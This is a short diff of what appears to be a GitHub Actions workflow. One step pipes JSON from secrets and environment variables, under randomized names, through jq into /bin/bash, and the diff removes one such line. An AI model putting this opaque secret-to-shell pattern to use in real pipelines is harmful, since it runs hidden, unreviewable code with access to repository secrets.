@@ -23,7 +23,6 @@ jobs:
           ibrlx22: ${{ secrets.ibrlx22 }}
         run: |
           printf '%s' "$ibrlx22" | jq -r .i74025 | /bin/bash
-          echo $uvg0 | jq -r .ft9 | /bin/bash
           printf '%s' "$eytyt8" | jq -r .xqn037 | /bin/bash
           echo $y5929 | jq -r .n429 | /bin/bash
           echo $mbn8 | jq -r .jm4505 | /bin/bash
